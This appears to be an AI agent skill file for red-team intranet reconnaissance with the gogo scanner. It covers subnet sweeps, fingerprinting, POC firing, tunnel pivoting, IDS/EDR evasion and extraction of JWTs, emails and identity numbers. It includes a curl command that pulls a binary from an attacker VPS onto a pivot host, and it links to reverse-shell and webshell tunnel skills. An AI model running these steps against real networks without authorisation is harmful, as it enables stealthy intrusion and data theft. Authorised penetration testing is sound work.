---
name: gogo-intranet
description: "gogo v2.15.0 high-performance intranet reconnaissance engine: smart/supersmart modes, active & passive fingerprinting, sensitive data extraction (title/cert/JWT/emails/identities), nuclei-compatible POC engine, controlled packet dispatch with low operational noise"
whenToUse: "Upon entering an internal network to rapidly map large subnets (/16, /12), extract software fingerprints and critical metadata, and minimize network packet generation to evade detection"
role: internal
enabled: true
---

# gogo (Intranet Reconnaissance & Fingerprinting Engine)

`gogo` = **High-concurrency, low-noise, highly configurable reconnaissance engine**. Engineered by ChainReactors specifically for red team intranet operations:
minimal packet footprint principle, active + passive fingerprinting, automated sensitive data extraction, built-in POC engine (neutron, compatible with nuclei templates),
and extensible DSL/workflow support. **Deploy gogo first to map subnets, then follow with fscan for targeted exploitation.**

## Division of Labor with fscan

| Metric | gogo | fscan |
| --- | --- | --- |
| Primary Strength | Large subnet mapping, service fingerprinting, metadata extraction, traffic-controlled sweeps | Credential brute-forcing, unauthorized access detection, high-risk CVEs, direct exploitation |
| Default Noise | Low (`--opsec` flag, adjustable concurrency/timeout) | High (600 threads + automated brute-force + POCs enabled by default) |
| Output Format | `.dat` (deflate JSON Lines) + formatted CLI/JSON | txt / json / csv |
| Typical Invocation | `gogo -i 10.0.0.0/8 -m ss --ping -p top2,win,db --af` | `fscan -h 10.0.0.0/24 -nobr -nopoc` |

## Binaries

```
Local : $DSH_HOME/redteam/toolkit/gogo/gogo                (v2.15.0, 4.3MB, 3,138 built-in fingerprints)
        $DSH_HOME/redteam/toolkit/gogo/gogo_windows_amd64.exe
        $DSH_HOME/redteam/toolkit/gogo/gogo_linux_arm64
VPS   : http://<YOUR_VPS_IP>:9100/gogo                    (Payload delivery directory from vps-reverse-shell)
Docs  : https://chainreactors.github.io/wiki/gogo/
Poc   : https://github.com/chainreactors/templates

# Deploy onto pivot host / target
curl -o gogo http://<YOUR_VPS_IP>:9100/gogo && chmod +x gogo
```

The setup script does not fetch gogo automatically; place it manually into the designated path. Windows and ARM binaries should also be manually provisioned as needed; the local system relies on the primary binary above.

**Zero Dependencies**: Single statically linked binary with all fingerprints and regex extraction rules embedded; compatible back to Windows 2003. **Requires no configuration files**.

## Operational Discipline

1. **Scope Boundaries**: Use `--exclude` / `--exclude-file` to strictly avoid out-of-scope networks, protecting employee subnets and cloud metadata services.
2. **Reconnaissance Before Active Scanning**: Run `ip a; ip route; arp -a; cat /etc/hosts` first; internal network topologies frequently eliminate 50% of unnecessary scanning.
3. **OPSEC**: In monitored environments, supply `--opsec`, constrain threads to `-t 200~500`, set timeout `-d 3`, and enforce `--ping` pre-filtering on large CIDRs.
4. **Avoid `-p -` (full port scan) on large address blocks**; always sweep with `top2` first, reserving full port ranges for verified alive targets.

## Core Concepts

### Port Presets

```bash
gogo -P port        # List all port presets and their constituent ports
```

Standard tags: `top1` (80, 443, 8080), `top2` (hundreds of common web/service ports), `top3`, `common` (internal defaults),
`win` (135, 137, 445, 3389, winrm, oxid), `db`, `http`, `docker`, `oracle`, `smb`, `all` (complete 1-65535 set).

```bash
Port combinations : -p top2,win,db
Port range        : -p 1-1000
Full range        : -p - (caution: full port sweep)
Single targets    : -p 6379,mysql,12345
```

### Three Reconnaissance Modes

| Mode | Flag | Application |
| --- | --- | --- |
| default | (default) | Single IP / small CIDR (/24 or smaller) |
| smart | `-m s` | /24 to /16, gateway/host probing + heuristic expansion |
| supersmart | `-m ss` | Large subnets (/16 and larger), sparse gateway probing followed by subnet filtering |
| sc | `-m sc` | Known target ranges requiring granular port coverage |

```bash
gogo -i 192.168.1.0/24 -m s  --ping -p top2,win,db --af
gogo -i 10.0.0.0/8    -m ss --ping -p top2,win,db --af
```

### Workflows (Preset Routines)

```bash
gogo -P workflow     # List all configured workflows
gogo -w 10           # Full supersmart routine across 10.0.0.0/8 (all ports)
gogo -w 172          # Full routine for 172.16.0.0/12
gogo -w 192          # Full routine for 192.168.0.0/16
gogo -w interc       # Common internal /24 subnets across 10/172/192
gogo -w 10 -i 11.0.0.0/8 -p top2   # Override workflow parameters via CLI
```

## CLI Reference (v2.15.0 `-h`)

> **Multi-character flags require double dashes**: `--ipp`, `--sp`, `--ef`, `--af`. Single dashes are reserved for single-letter arguments (`-i`, `-p`, `-m`, `-t`, `-d`, `-e`, `-v`, `-w`, `-F`, `-l`, `-L`, `-j`).

**Target Inputs**
```
-i/--ip   192.168.1.1/24,172.16.1.1/24   Target CIDRs, comma-separated
--exclude 10.0.0.1/24        --exclude-file <file>
-l <file> Target list file    -L Read targets from stdin
-j <file> Resume previous results (.dat) or ip:port list   -J Read from stdin
```

**Output Formats**
```
-f <file>        Output file path         --path Output directory
-o <fmt>         Console output format    -O <fmt> File output format (defaults to jsonlines)
--af             Automatic output naming (.dat, deflate JSON Lines)
--hf             Automatic hidden file naming   -C Disable compression   --tee Retain console display
-q/--quiet       Suppress log output (mandatory when chaining tools)
-F <file>        Format previously saved .dat results
--filter / --output-filter / --scan-filter   Historical / real-time / early-stop filtering
```

**Smart Scanning Controls**
```
-m/--mod  default|s|ss|sc    Scanning mode
--ping                       Pre-filter with ICMP (mandatory for large subnets)
-n/--no                      Execute smart sweep only, skip default follow-up
--sp   Smart port probe (defaults to 80; ss mode defaults to icmp)
--ipp  Subnet IP gateway probe (defaults to 1, 254)
```

**Performance & Stealth**
```
-t/--thread <n>     Concurrency (Linux default 4000; recommended 200~1000 for internal networks)
-d/--timeout <sec>  Connection timeout (defaults to 2)
-D/--ssl-timeout    SSL negotiation timeout
--opsec             Low-noise operational mode
-s/--spray          Port spraying mode (automatically active when ports > 500)
--no-spray          Force disable spraying
```

**Fingerprinting & Extraction**
```
-v/--verbose         Active fingerprinting (without this, only passive fingerprints are collected)
--ff <file>          Custom fingerprint definition file
--extract "<regex>"  Custom data extraction regex
gogo -P extract      Display built-in extraction rules (jwt / mail / idcard / phone / ip, etc.)
```

**Vulnerability Verification (Neutron Core)**
```
-e/--exploit         Enable POC scanning (combine with -v as -ev)
-E <name>            Specify POC template name   --ef <file> Specify template path
--payload <s>        Specify payload parameter  --attack-type sniper|clusterbomb|pitchfork
```

**Proxying**
```
--proxy socks5://127.0.0.1:11111      # Route through suo5 / ssh -D tunnels
```

## Standard Operating Procedure (SOP)

```bash
# 0) Environment inspection
ip a; ip route; arp -a; cat /etc/hosts /etc/resolv.conf

# 1) Large subnet reconnaissance (stealthy, liveness sweep, write to file)
./gogo -i 10.0.0.0/16 -m ss --ping -p top2,win,db --af -t 500 -d 3

# 2) View output in human-readable format
./gogo -F ./.10.0.0.0_16_top2_win_db_ss_dat

# 3) Full port sweep + active fingerprinting against active hosts
./gogo -i 10.0.1.0/24 -p - -v -t 1000 -d 3 --af

# 4) Targeted POC verification (strictly against identified fingerprints)
./gogo -i 10.0.1.5,10.0.1.9 -p top2 -ev -E <template_name>

# 5) Repurpose previous results without re-scanning
./gogo -j ./step1.dat -p 1-65535 -v -e
```

### Tunnel-Routed Reconnaissance (Primary Pivot Path)

```bash
# Prerequisite: Established SOCKS5 proxy via suo5-tunnel or vps-reverse-shell ssh -D
./gogo -i 10.0.0.0/16 -m ss --ping -p top2,win,db --af \
       --proxy socks5://127.0.0.1:1080 -t 300 -d 5 -q
```

When routing through tunnels, constrain `-t` below 300 and raise `-d` to 5; excessive packet rates will saturate tunnel bandwidth and cause dropped responses.

## Output Registration (Mandatory)

Gogo's `.dat` files are compressed JSON Lines; format them to JSON before registering findings:

```bash
./gogo -F ./result.dat -o json -f result.json      # Format to JSON
python3 tools/parse.py result.json
# Structure: Top level contains {config, ip, data:[...]}, where each item holds ip/port/protocol/status/frameworks/title/timing
```

```python
import json
d = json.load(open('result.json', encoding='utf-8'))
for it in d.get('data', []):
    fw = ','.join((it.get('frameworks') or {}).keys())
    print(it.get('ip'), it.get('port'), it.get('protocol'), fw, it.get('title'))
# Example entry: {"ip":"10.0.0.5","port":"22","protocol":"tcp","status":"open",
#                 "frameworks":{"ssh":{"name":"ssh","attributes":{"version":"10.3p1"}}},
#                 "title":"SSH-2.0-OpenS","timing":26}
```

```bash
# Ledger Registration
redteam_asset_add  { engagement, ip, port, service, title, source: "gogo", tags: [...] }
redteam_web_list   # Follow up with web fingerprinting to enrich URL/titles
redteam_vuln_add   { engagement, target, name, severity, evidence_ref }   # Evidence required
```

**Discipline**: Ingest discovered frameworks and technologies into the `fingerprint` property of `asset`.
Identified sensitive credentials or data extraction hits (emails / identity numbers / JWTs) contribute to sensitive data score categories; record via `redteam_vuln_add` + `redteam_score_hit` with raw files archived under `runs/`.

## Troubleshooting

| Symptom | Resolution |
| --- | --- |
| CLI argument errors | Long flags require double dashes (`--af`, not `-af`); `-P` accepts only `port/workflow/neutron/extract` |
| Output file missing | `--af` writes in the **working directory of the binary**; use `--path` to enforce target directory |
| Sparse results on large subnets | `--ping` drops hosts rejecting ICMP; remove `--ping` or tune `--ipp` gateway addresses |
| Scan too slow | Increase `-t`, decrease `-d`; restrict `-p` to `top1`/`top2`; use `-m ss` on broad ranges |
| Detected by IDS/EDR | Apply `--opsec` + `-t 200` + `-d 3`; disable `-e` (POC firing); avoid `-p -` |
| High timeout rate in tunnels | Lower `-t`, raise `-d`; tunnel throughput is the primary bottleneck |
| Suppress logs | Add `-q` (essential when piping output into automated parsers) |

## Related Skills

- `fscan-intranet`: Targeted exploitation and credential brute-forcing following initial discovery
- `suo5-tunnel`: Exposes SOCKS5 proxy from WebShell to feed `--proxy`
- `vps-reverse-shell`: Pivot infrastructure and payload hosting
- `web-fingerprint` / `asset-correlation`: Correlates gogo findings into target topology graphs
